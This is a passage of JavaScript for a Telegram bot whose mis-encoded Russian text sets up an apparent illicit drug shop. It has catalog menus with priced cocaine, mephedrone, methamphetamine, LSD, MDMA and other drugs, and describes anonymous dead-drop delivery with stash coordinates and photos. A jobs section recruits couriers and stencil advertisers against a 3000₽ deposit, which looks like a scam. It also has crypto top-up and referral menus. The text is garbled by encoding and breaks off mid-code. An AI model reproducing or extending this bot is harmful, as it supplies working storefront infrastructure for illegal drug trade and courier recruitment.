–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –ø–æ –∑–∞–ª–æ–≥—É –æ—Ç 3000‚ÇΩ. –î–ª—è –Ω–∞—á–∞–ª–∞ —Ç—Ä—É–¥–æ—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–∞–ø–∏—à–∏—Ç–µ —Å–≤–æ–π –≥–æ—Ä–æ–¥ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É.

`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä", callback_data: `tkur` },
                { text: "üñº –¢—Ä–∞—Ñ–∞—Ä–µ—Ç—á–∏–∫", callback_data: `traf` },
                { text: "üöõ –í–æ–¥–∏—Ç–µ–ª—å", callback_data: `vodila` },
                 ],
                 [
{ text: "üì∞ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data: `veg` },
{ text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", callback_data: `oper` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("work")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üî• –†–∞–±–æ—Ç–∞ üî•

–°–≤–æ–±–æ–¥–Ω—ã–µ –≤–∞–∫–∞–Ω—Å–∏–∏ –≤ –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ:
`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üèÉ‚Äç‚ôÇÔ∏è –ö—É—Ä—å–µ—Ä", callback_data: `tkur` },
                { text: "üñº –¢—Ä–∞—Ñ–∞—Ä–µ—Ç—á–∏–∫", callback_data: `traf` },
                { text: "üöõ –í–æ–¥–∏—Ç–µ–ª—å", callback_data: `vodila` },
                 ],
                 [
{ text: "üì∞ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data: `veg` },
{ text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", callback_data: `oper` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("deposit")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
    await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `deposit` } })
return bot.sendMessage(message.chat.id,`üëâüèª –í–≤–µ–¥–∏—Ç–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é —Å—É–º–º—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è:`, {
reply_markup: {
		inline_keyboard: [
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("referal")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ üë•

–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞: http://t.me/Fjdjfkfjckdibot?start=${message.user.id}

‚ñ™Ô∏è –ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ –∑–∞ –≤—Å—ë –≤—Ä–µ–º—è: 0 ‚ÇΩ

–ï—Å–ª–∏ —á–µ–ª–æ–≤–µ–∫, –ø—Ä–∏–≥–ª–∞—à–µ–Ω–Ω—ã–π –ø–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ, –ø–æ–ø–æ–ª–Ω–∏—Ç –±–∞–ª–∞–Ω—Å, —Ç–æ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 10% –æ—Ç —Å—É–º–º—ã –µ–≥–æ –¥–µ–ø–æ–∑–∏—Ç–∞`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
                { text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
                 ],
                 [
                    { text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                    { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                    { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                 ],
                 [
{ text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
{ text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
                 ],
                 [
                    { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}


if(query.data.startsWith("kur")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üöï –î–æ—Å—Ç–∞–≤–∫–∞ üöï

‚ñ™Ô∏è –ü—Ä–∏ –ø–æ–∫—É–ø–∫–µ –ª—é–±–æ–≥–æ —Ç–æ–≤–∞—Ä–∞ –∏–∑ –∫–∞—Ç–∞–ª–æ–≥–∞ –≤—ã –º–æ–∂–µ—Ç–µ –∑–∞–∫–∞–∑–∞—Ç—å –¥–æ—Å—Ç–∞–≤–∫—É. 

‚ñ™Ô∏è –î–æ—Å—Ç–∞–≤–∫–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é –∞–Ω–æ–Ω–∏–º–Ω–∞—è –∏ –±–µ—Å–∫–æ–Ω—Ç–∞–∫—Ç–Ω–∞—è. –î–ª—è –æ—Å—É—â–µ—Å—Ç–≤–ª–µ–Ω–∏—è –¥–æ—Å—Ç–∞–≤–∫–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É–∫–∞–∑–∞—Ç—å –∂–µ–ª–∞–µ–º—ã–π –∞–¥—Ä–µ—Å –∏ –∫—É—Ä—å–µ—Ä –æ—Å—Ç–∞–≤–∏—Ç –∫–ª–∞–¥ –≤ —Ä–∞–¥–∏—É—Å–µ 300–º, –ø–æ—Å–ª–µ —á–µ–≥–æ —Å–æ–æ–±—â–∏—Ç –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –ø—Ä–∏–ª–æ–∂–∏–≤ –ø–æ–¥—Ä–æ–±–Ω—ã–µ —Ñ–æ—Ç–æ.

üí∏ –°—Ç–æ–∏–º–æ—Å—Ç—å –¥–æ—Å—Ç–∞–≤–∫–∏:
‚ñ´Ô∏è –û–±—ã—á–Ω–∞—è ‚Äî 1200 ‚ÇΩ
‚ïö –°—Ä–æ–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: –æ—Ç 4 –¥–æ 12 —á–∞—Å–æ–≤
‚ñ´Ô∏è –£—Å–∫–æ—Ä–µ–Ω–Ω–∞—è ‚Äî 1800 ‚ÇΩ
‚ïö –°—Ä–æ–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: –æ—Ç 1 –¥–æ 2 —á–∞—Å–æ–≤

‚ñ™Ô∏è –ü—Ä–∏ –∑–∞–∫–∞–∑–µ –æ—Ç 8000 ‚ÇΩ –¥–æ—Å—Ç–∞–≤–∫–∞ –∑–∞ —Å—á–µ—Ç –º–∞–≥–∞–∑–∏–Ω–∞.`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
                { text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
                 ],
                 [
                    { text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                    { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                    { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                 ],
                 [
{ text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
{ text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
                 ],
                 [
                    { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}



if(query.data.startsWith("fout")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`–í—ã–±–µ—Ä–∏—Ç–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.`, {
reply_markup: {
		inline_keyboard: [
			[{ text: "Tether - USDT (TRC20, ERC20, BEP20)", callback_data: `out_tether` }],
			[{ text: "Toncoin - TON (TON)", callback_data: `out_ton` }],
			[{ text: "Bitcoin - BTC (BTC)", callback_data: `out_btc` }],
			[{ text: "Ethereum - ETH (ERC20)", callback_data: `out_eth` }],
			[{ text: "Binance Coin - BNB (BEP20)", callback_data: `out_bnb` }],
			[{ text: "Binance USD - BUSD (BEP20)", callback_data: `out_busd` }],
[{ text: "< –ù–∞–∑–∞–¥", callback_data: `menu` }],
		]
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("check")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üí∞ <b>–ß–µ–∫–∏</b>
    
<b>–ú–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å</b>:
¬∑ –ü–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–π - —á–µ–∫ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –º–æ–Ω–µ—Ç –æ–¥–Ω–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
¬∑ –ú—É–ª—å—Ç–∏-—á–µ–∫ - —á–µ–∫ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –º–æ–Ω–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–∏–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º
¬∑ Rocket-—á–µ–∫ - –∞–Ω–∞–ª–æ–≥ –º—É–ª—å—Ç–∏-—á–µ–∫–∞, –Ω–æ —Å –±–æ–ª—å—à–∏–º –Ω–∞–±–æ—Ä–æ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π

–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —á–µ–∫–∞:
`, {
reply_markup: {
		inline_keyboard: [
			[{ text: "–ü–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ", callback_data: `gift` },{ text: "–ú—É–ª—å—Ç–∏", callback_data: `raz` }],
			[{ text: "üöÄ Rocket", callback_data: `raz` }],
[{ text: "< –ù–∞–∑–∞–¥", callback_data: `menu` }],
		]
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("ref")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üõ° <b>–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞</b>

–ß—Ç–æ –±—ã –∑–∞—Ä–∞–±–æ—Ç–∞—Ç—å –µ—â—ë, –í–∞–º –Ω—É–∂–Ω–æ –ø–æ–¥–µ–ª–∏—Ç—å—Å—è —Å–≤–æ–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–æ–π –Ω–∞ –¥–∞–Ω–Ω—ã–π —á–µ–∫.

<b>–í—ã –ø–æ–ª—É—á–∏—Ç–µ TON –∑–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —á–µ–∫–∞ –ø–æ –í–∞—à–µ–π —Å—Å—ã–ª–∫–µ.</b>

–í–∞—à–∞ –Ω–∞–≥—Ä–∞–¥–∞ –∑–∞ —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: 
			> 1 —É—Ä–æ–≤–µ–Ω—å: <b>0.03 TON (0.07$)</b>
			> 2 —É—Ä–æ–≤–µ–Ω—å: <b>0.02 TON (0.05$)</b>
			> 3 —É—Ä–æ–≤–µ–Ω—å: <b>0.01 TON (0.03$)</b>
			> 4 —É—Ä–æ–≤–µ–Ω—å: <b>0.005 TON (0.01$)</b>
			> 5 —É—Ä–æ–≤–µ–Ω—å: <b>0.002 TON (0.005$)</b>

–ó–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏—é —á–µ–∫–∞ –≤–∞—à —Ä–µ—Ñ–µ—Ä–∞–ª –ø–æ–ª—É—á–∏—Ç –Ω–∞–≥—Ä–∞–¥—É: <b>0.02 TON (0.05$)</b>

–°—Å—ã–ª–∫–∞:
https://t.me/TokenRocketRobot?start=${message.user.id}`, {
reply_markup: {
		inline_keyboard: [
			[{ text: "–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data: `statsref` }],
			[{ text: "–ü–æ–∫–∞–∑–∞—Ç—å QR –∫–æ–¥", callback_data: `qrref` }],
[{ text: "< –ù–∞–∑–∞–¥", callback_data: `menu` }],
		]
	},
parse_mode: "HTML"
});
}

		if(query.data.startsWith("qrref")) {				
			bot.deleteMessage(message.chat.id, message.message_id)
			var result = random.generate(30)
			var png = random.generate(10)
			qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=${message.user.id}`, {
			  color: {
				dark: '#000',  
				light: '#0000'
			  }
			}, function (err) {
			  if (err) throw err
			  console.log('done')
			})
							let file = `${png}.png`
							
					 bot.sendPhoto(message.user.id, file, {
						caption: `–î–∞–Ω–Ω—ã–π QR –∫–æ–¥ –º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥—Ä—É–≥—É, –∑–∞ –ø–µ—Ä–µ—Ö–æ–¥ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –±–æ–Ω—É—Å`,
						reply_markup: {
								inline_keyboard: [
						[{ text: "< –ù–∞–∑–∞–¥", callback_data: `ref` }],
								]
							},
						}) 
					
				fs.unlink(`${png}.png`, (err) => {
			 if (err) throw err;
			
			  console.log('Deleted');
					})
		}

if(query.data.startsWith("statsref")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`
üöÄ <b>–í–∞—à–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã</b>

–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø—Ä–∏–≥–ª–∞—à–µ–Ω–æ –ø–æ —Å—Å—ã–ª–∫–µ: <b>${message.user.part}</b>
–í—ã –ø–æ–ª—É—á–∏–ª–∏ –Ω–∞–≥—Ä–∞–¥ –∫–∞–∫ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–∏—Ç–µ–ª—å: 
 ¬∑ <b>${message.user.refmoney} TON</b>`, {
reply_markup: {
		inline_keyboard: [
[{ text: "< –ù–∞–∑–∞–¥", callback_data: `ref` }],
		]
	},
parse_mode: "HTML"
});
}

		if(query.data.startsWith("market")) {
							
			bot.deleteMessage(message.chat.id, message.message_id)

		return bot.sendMessage(message.chat.id,`
		üí± –ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –∫—É–ø–∏—Ç—å –∏–ª–∏ –ø—Ä–æ–¥–∞—Ç—å –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É —Å –ø–æ–º–æ—â—å—é –ø–µ—Ä–µ–≤–æ–¥–∞ –Ω–∞ –∫–∞—Ä—Ç—É –∏–ª–∏ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ã–π –∫–æ—à–µ–ª—ë–∫.

		üõ° –ë–æ—Ç –≤—ã—Å—Ç—É–ø–∞–µ—Ç –≥–∞—Ä–∞–Ω—Ç–æ–º –∏ —É–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –º–æ–Ω–µ—Ç—ã –Ω–∞ –≤—Ä–µ–º—è —Å–¥–µ–ª–∫–∏. –ö–æ–º–∏—Å—Å–∏—è –Ω–∞ –ø–æ–∫—É–ø–∫—É ‚Äì 0%, –Ω–∞ –ø—Ä–æ–¥–∞–∂—É ‚Äì 0.75%.
		
		üîë –î–∞–Ω–Ω—ã–π —Ä–∞–∑–¥–µ–ª –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ`, {
reply_markup: {
				inline_keyboard: [
		[{ text: "üìà –ö—É–ø–∏—Ç—å", callback_data: `raz` },{ text: "üìâ –ü—Ä–æ–¥–∞—Ç—å", callback_data: `raz` }],
		[{ text: "üìã –ú–æ–∏ —Å–¥–µ–ª–∫–∏", callback_data: `raz` },{ text: "üìÑ –ò—Å—Ç–æ—Ä–∏—è", callback_data: `raz` }],
		[{ text: "üîí –°–æ–∑–¥–∞—Ç—å –æ–±—ä—è–≤–ª–µ–Ω–∏–µ", callback_data: `raz` }],
		[{ text: "‚öô –ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data: `raz` }],
		[{ text: "< –ù–∞–∑–∞–¥", callback_data: `menu` }],
				]
			},
parse_mode: "HTML"
});
}

if(query.data.startsWith("kup")) {
    let id		= (query.data.split("_")[1])
    console.log(id)
if(id == 1) {
    bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
reply_markup: {
        inline_keyboard: [
[{ text: "üîÆ –ê–ª—å—Ñ–∞ BLUECRYS 1–≥—Ä", callback_data: `bano_3499` },{ text: "üîÆ –õ–°–î 6—à—Ç", callback_data: `bano_7299` }],
[{ text: "üîÆ –õ–°–î 2—à—Ç", callback_data: `bano_2899` },{ text: "üîÆ –ö–û–ö–° - Prestige 0.5–≥—Ä", callback_data: `bano_6999` }],
[{ text: "üîÆ –ö–û–ö–° - Prestige 2–≥—Ä", callback_data: `bano_19999` },{ text: "üîÆ –ú–µ—Ñ GOLDEN 2–≥—Ä", callback_data: `bano_4599` }],
[{ text: "üîÆ –ì–ê–®–ò–® - TWIX 4–≥—Ä", callback_data: `bano_6399` },{ text: "üîÆ –ú–ï–§–ï–î–†–û–ù - FLOUR 1–≥—Ä", callback_data: `bano_2199` }],
[{ text: "üîÆ –ê–ª—å—Ñ–∞ BLUECRYS 3–≥—Ä", callback_data: `bano_7895` }],
[{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
        ]
    },
parse_mode: "HTML"
});
}

if(id == 2) {
    bot.deleteMessage(message.chat.id, message.message_id)
    return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
    reply_markup: {
            inline_keyboard: [
    [{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ BARCELONA 5—à—Ç", callback_data: `bano_5695` },{ text: "üîÆ –õ–°–î 5—à—Ç", callback_data: `bano_6399` }],
    [{ text: "üîÆ –®–∏—à–∏–∫–∏ Tutankhamon 2–≥—Ä", callback_data: `bano_4699` },{ text: "üîÆ –ú–ï–§–ï–î–†–û–ù - FLOUR 10–≥—Ä", callback_data: `bano_16999` }],
    [{ text: "üîÆ –®–∏—à–∏–∫–∏ Peyote Crit 1–≥—Ä", callback_data: `bano_2699` },{ text: "üîÆ –õ–°–î 6—à—Ç", callback_data: `bano_7299` }],
    [{ text: "üîÆ –ì–ê–®–ò–® - TWIX 1–≥—Ä", callback_data: `bano_2495` }],
    [{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
            ]
        },
    parse_mode: "HTML"
    });
    }

    if(id == 3) {
        bot.deleteMessage(message.chat.id, message.message_id)
        return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
        reply_markup: {
                inline_keyboard: [
        [{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ BARCELONA 10—à—Ç", callback_data: `bano_8990` },{ text: "üîÆ –®–∏—à–∏–∫–∏ Tutankhamon 1–≥—Ä", callback_data: `bano_2899` }],
        [{ text: "üîÆ –õ–°–î 2—à—Ç", callback_data: `bano_2899` },{ text: "üîÆ –ú–µ—Ñ GOLDEN 1–≥—Ä", callback_data: `bano_2499` }],
        [{ text: "üîÆ –®–∏—à–∏–∫–∏ Peyote Crit 2–≥—Ä", callback_data: `bano_4399` },{ text: "üîÆ –ì–ê–®–ò–® - TWIX 2–≥—Ä", callback_data: `bano_3895` }],
        [{ text: "üîÆ –ú–ï–§–ï–î–†–û–ù - FLOUR 3–≥—Ä", callback_data: `bano_4799` },{ text: "üîÆ –ú–ï–¢–ê–ú–§–ï–¢–ê–ú–ò–ù 3–≥—Ä", callback_data: `bano_7499` }],
        [{ text: "üîÆ –ì–ê–®–ò–® - TWIX 5–≥—Ä", callback_data: `bano_7395` },{ text: "üîÆ –®–∏—à–∏–∫–∏ Tutankhamon 3–≥—Ä ", callback_data: `bano_5899` }],
        [{ text: "üîÆ –ê–ª—å—Ñ–∞ BLUECRYS 2–≥—Ä", callback_data: `bano_5697` }],
        [{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
                ]
            },
        parse_mode: "HTML"
        });
        }

        if(id == 4) {
            bot.deleteMessage(message.chat.id, message.message_id)
            return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
            reply_markup: {
                    inline_keyboard: [
            [{ text: "üîÆ –ö–û–ö–° - Prestige 1–≥—Ä", callback_data: `bano` },{ text: "üîÆ –ú–µ—Ñ GOLDEN 2–≥—Ä", callback_data: `bano_4599` }],
            [{ text: "üîÆ –õ–°–î 2—à—Ç", callback_data: `bano_2899` },{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ BARCELONA 5—à—Ç", callback_data: `bano` }],
            [{ text: "üîÆ –®–∏—à–∏–∫–∏ Tutankhamon 3–≥—Ä", callback_data: `bano` },{ text: "üîÆ –ö–°–ê–ù–ê–ö–° 5—à—Ç", callback_data: `bano` }],
            [{ text: "üîÆ –®–∏—à–∏–∫–∏ Peyote Crit 2–≥—Ä", callback_data: `bano` }],
            [{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
                    ]
                },
            parse_mode: "HTML"
            });
            }

            if(id == 5) {
                bot.deleteMessage(message.chat.id, message.message_id)
                return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
                reply_markup: {
                        inline_keyboard: [
                [{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ BARCELONA 15—à—Ç", callback_data: `bano` },{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ HAINEKEN 8—à—Ç", callback_data: `bano` }],
                [{ text: "üîÆ –®–∏—à–∏–∫–∏ Peyote Crit 2–≥—Ä", callback_data: `bano` },{ text: "üîÆ –ì–ê–®–ò–® - TWIX 2–≥—Ä", callback_data: `bano` }],
                [{ text: "üîÆ –ê–ª—å—Ñ–∞ BLUECRYS 3–≥—Ä", callback_data: `bano` },{ text: "üîÆ MDMA (–ï–≤—Ä–æ–ø–∞) 3—à—Ç", callback_data: `bano` }],
                [{ text: "üîÆ –ú–ï–¢–ê–ú–§–ï–¢–ê–ú–ò–ù 2–≥—Ä", callback_data: `bano` },{ text: "üîÆ –ö–°–ê–ù–ê–ö–° 3—à—Ç", callback_data: `bano` }],
                [{ text: "üîÆ –ö–°–ê–ù–ê–ö–° 5—à—Ç", callback_data: `bano` }],
                [{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
                        ]
                    },
                parse_mode: "HTML"
                });
                }

                if(id == 6) {
                    bot.deleteMessage(message.chat.id, message.message_id)
                    return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
                    reply_markup: {
                            inline_keyboard: [
                    [{ text: "üîÆ –ö–°–ê–ù–ê–ö–° 5—à—Ç", callback_data: `bano` },{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ BARCELONA 5—à—Ç", callback_data: `bano` }],
                    [{ text: "üîÆ –ú–µ—Ñ GOLDEN 1–≥—Ä", callback_data: `bano_2499` },{ text: "üîÆ –õ–°–î 5—à—Ç", callback_data: `bano_6399` }],
                    [{ text: "üîÆ –ê–ª—å—Ñ–∞ BLUECRYS 1–≥—Ä", callback_data: `bano` },{ text: "üîÆ –®–∏—à–∏–∫–∏ Peyote Crit 1–≥—Ä", callback_data: `bano` }],
                    [{ text: "üîÆ –ì–ê–®–ò–® - TWIX 3–≥—Ä", callback_data: `bano` },{ text: "üîÆ –ú–ï–¢–ê–ú–§–ï–¢–ê–ú–ò–ù 1–≥—Ä", callback_data: `bano` }],
                    [{ text: "üîÆ –ú–ï–§–ï–î–†–û–ù - FLOUR 5–≥—Ä", callback_data: `bano` }],
                    [{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
                            ]
                        },
                    parse_mode: "HTML"
                    });
                    }

                    if(id == 7) {
                        bot.deleteMessage(message.chat.id, message.message_id)
                        return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
                        reply_markup: {
                                inline_keyboard: [
                        [{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ BARCELONA 15—à—Ç", callback_data: `bano` },{ text: "üîÆ –ê–ª—å—Ñ–∞ BLUECRYS 2–≥—Ä", callback_data: `bano` }],
                        [{ text: "üîÆ –ö–û–ö–° - Prestige 0.5–≥—Ä", callback_data: `bano` },{ text: "üîÆ –ö–û–ö–° - Prestige 1–≥—Ä", callback_data: `bano` }],
                        [{ text: "üîÆ –®–∏—à–∏–∫–∏ Tutankhamon 1–≥—Ä", callback_data: `bano` },{ text: "üîÆ –ú–µ—Ñ GOLDEN 3–≥—Ä", callback_data: `bano_5899` }],
                        [{ text: "üîÆ –ú–ï–§–ï–î–†–û–ù - FLOUR 10–≥—Ä", callback_data: `bano` },{ text: "üîÆ –®–∏—à–∏–∫–∏ Peyote Crit 3–≥—Ä", callback_data: `bano` }],
                        [{ text: "üîÆ –ú–ï–¢–ê–ú–§–ï–¢–ê–ú–ò–ù 5–≥—Ä", callback_data: `bano` }],
                        [{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
                                ]
                            },
                        parse_mode: "HTML"
                        });
                        }

                        if(id == 8) {
                             bot.deleteMessage(message.chat.id, message.message_id)
                            return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
                            reply_markup: {
                                    inline_keyboard: [
                                        [{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ BARCELONA 10—à—Ç", callback_data: `bano_8990` },{ text: "üîÆ –®–∏—à–∏–∫–∏ Tutankhamon 1–≥—Ä", callback_data: `bano_2899` }],
                            [{ text: "üîÆ –õ–°–î 6—à—Ç", callback_data: `bano_7299` },{ text: "üîÆ –ú–µ—Ñ GOLDEN 3–≥—Ä", callback_data: `bano_5899` }],
                            [{ text: "üîÆ –ì–ê–®–ò–® - TWIX 5–≥—Ä", callback_data: `bano_7395` },{ text: "üîÆ –®–∏—à–∏–∫–∏ Tutankhamon 3–≥—Ä ", callback_data: `bano_5899` }],
                            [{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
                                    ]
                                },
                            parse_mode: "HTML"
                            });
                            }
                            if(id == 9) {
                                bot.deleteMessage(message.chat.id, message.message_id)
                                return bot.sendMessage(message.chat.id,`üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ç–æ–≤–∞—Ä:`, {
                                reply_markup: {
                                        inline_keyboard: [
